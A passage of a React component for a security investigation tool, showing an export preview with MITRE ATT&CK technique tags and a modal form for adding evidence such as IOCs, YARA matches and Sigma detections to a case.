                        <div className="text-xs text-null-muted">Styled HTML document for presentation</div>
                      </div>
                    </button>
                  </div>
                </div>

                {/* Export Preview */}
                <div className="bg-null-surface rounded-lg border border-null-border p-4">
                  <h3 className="font-medium text-null-text mb-4">Export Preview</h3>
                  <div className="space-y-4">
                    <div className="p-3 rounded bg-null-bg border border-null-border">
                      <div className="text-xs text-null-muted mb-1">Report Title</div>
                      <div className="text-sm text-null-text">{reportTitle}</div>
                    </div>
                    <div className="p-3 rounded bg-null-bg border border-null-border">
                      <div className="text-xs text-null-muted mb-1">Case ID</div>
                      <div className="text-sm text-null-text font-mono">{caseId}</div>
                    </div>
                    <div className="p-3 rounded bg-null-bg border border-null-border">
                      <div className="text-xs text-null-muted mb-1">Evidence Included</div>
                      <div className="text-sm text-null-text">
                        {selectedEvidence.size > 0
                          ? `${selectedEvidence.size} selected items`
                          : `All ${evidence.length} items`}
                      </div>
                    </div>
                    <div className="p-3 rounded bg-null-bg border border-null-border">
                      <div className="text-xs text-null-muted mb-1">Sections</div>
                      <div className="text-sm text-null-text">
                        {sections.filter(s => s.content).length} / {sections.length} completed
                      </div>
                    </div>

                    <div className="border-t border-null-border pt-4">
                      <h4 className="text-sm font-medium text-null-text mb-2">MITRE ATT&CK Coverage</h4>
                      <div className="flex flex-wrap gap-1">
                        {[...new Set(evidence.flatMap(e => e.mitreTechniques || []))].map(t => (
                          <span key={t} className="px-2 py-0.5 rounded text-xs bg-red-500/20 text-red-400">
                            {t}
                          </span>
                        ))}
                      </div>
                    </div>

                    <div className="border-t border-null-border pt-4">
                      <h4 className="text-sm font-medium text-null-text mb-2">All Tags</h4>
                      <div className="flex flex-wrap gap-1">
                        {[...new Set(evidence.flatMap(e => e.tags || []))].map(t => (
                          <span key={t} className="px-2 py-0.5 rounded text-xs bg-null-border text-null-muted">
                            {t}
                          </span>
                        ))}
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </motion.div>
          )}
        </AnimatePresence>
      </div>

      {/* Add Evidence Modal */}
      <AnimatePresence>
        {showAddEvidence && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 bg-black/50 flex items-center justify-center z-50"
            onClick={() => setShowAddEvidence(false)}
          >
            <motion.div
              initial={{ scale: 0.9, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              exit={{ scale: 0.9, opacity: 0 }}
              onClick={(e) => e.stopPropagation()}
              className="bg-null-surface rounded-xl border border-null-border p-6 w-full max-w-lg"
            >
              <h2 className="text-lg font-display text-null-text mb-4">Add Evidence</h2>

              <div className="space-y-4">
                <div className="grid grid-cols-2 gap-4">
                  <div>
                    <label className="text-sm text-null-muted block mb-1">Type</label>
                    <select
                      value={newEvidence.type}
                      onChange={(e) => setNewEvidence({ ...newEvidence, type: e.target.value as Evidence['type'] })}
                      className="w-full bg-null-bg border border-null-border rounded-lg px-3 py-2 text-null-text"
                    >
                      <option value="ioc">IOC</option>
                      <option value="yara">YARA Match</option>
                      <option value="sigma">Sigma Detection</option>
                      <option value="intel">Threat Intel</option>
                      <option value="note">Note</option>
                      <option value="artifact">Artifact</option>
                      <option value="network">Network</option>
                      <option value="file">File</option>
                    </select>
                  </div>
                  <div>
                    <label className="text-sm text-null-muted block mb-1">Severity</label>
                    <select
                      value={newEvidence.severity}
                      onChange={(e) => setNewEvidence({ ...newEvidence, severity: e.target.value as Evidence['severity'] })}
                      className="w-full bg-null-bg border border-null-border rounded-lg px-3 py-2 text-null-text"
                    >
                      <option value="critical">Critical</option>
                      <option value="high">High</option>
                      <option value="medium">Medium</option>
                      <option value="low">Low</option>
                      <option value="info">Info</option>
                    </select>
                  </div>
                </div>

                <div>
                  <label className="text-sm text-null-muted block mb-1">Title</label>
                  <input
                    type="text"
                    value={newEvidence.title || ''}
                    onChange={(e) => setNewEvidence({ ...newEvidence, title: e.target.value })}
                    placeholder="Brief title for the evidence"
                    className="w-full bg-null-bg border border-null-border rounded-lg px-3 py-2 text-null-text"
                  />
                </div>

                <div>
                  <label className="text-sm text-null-muted block mb-1">Description</label>
                  <textarea
                    value={newEvidence.description || ''}
                    onChange={(e) => setNewEvidence({ ...newEvidence, description: e.target.value })}
                    placeholder="Detailed description of the evidence"
                    rows={3}
                    className="w-full bg-null-bg border border-null-border rounded-lg px-3 py-2 text-null-text resize-none"
                  />
                </div>

                <div>
                  <label className="text-sm text-null-muted block mb-1">Source</label>
                  <input
                    type="text"
                    value={newEvidence.source || ''}
                    onChange={(e) => setNewEvidence({ ...newEvidence, source: e.target.value })}
                    placeholder="e.g., Network Traffic, Memory Analysis"
                    className="w-full bg-null-bg border border-null-border rounded-lg px-3 py-2 text-null-text"
                  />
                </div>

                <div>
                  <label className="text-sm text-null-muted block mb-1">MITRE Techniques (comma-separated)</label>
                  <input
                    type="text"
                    value={newEvidence.mitreTechniques?.join(', ') || ''}
                    onChange={(e) => setNewEvidence({
                      ...newEvidence,
                      mitreTechniques: e.target.value.split(',').map(t => t.trim()).filter(Boolean)
                    })}
                    placeholder="e.g., T1059.001, T1055"
                    className="w-full bg-null-bg border border-null-border rounded-lg px-3 py-2 text-null-text font-mono"
                  />
                </div>

                <div>
                  <label className="text-sm text-null-muted block mb-1">Tags (comma-separated)</label>
                  <input
                    type="text"
                    value={newEvidence.tags?.join(', ') || ''}
                    onChange={(e) => setNewEvidence({
                      ...newEvidence,
                      tags: e.target.value.split(',').map(t => t.trim()).filter(Boolean)
                    })}
                    placeholder="e.g., malware, cobalt-strike, persistence"
                    className="w-full bg-null-bg border border-null-border rounded-lg px-3 py-2 text-null-text"
                  />
                </div>
              </div>

              <div className="flex justify-end gap-2 mt-6">
                <button
                  onClick={() => setShowAddEvidence(false)}
                  className="px-4 py-2 rounded-lg bg-null-border text-null-muted hover:text-null-text transition-colors"
                >
                  Cancel
                </button>
                <button
                  onClick={addEvidence}
                  disabled={!newEvidence.title || !newEvidence.description}
                  className="px-4 py-2 rounded-lg bg-null-primary text-null-bg hover:bg-null-primary/90 disabled:opacity-50 transition-colors"
                >
                  Add Evidence
                </button>
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  )
}
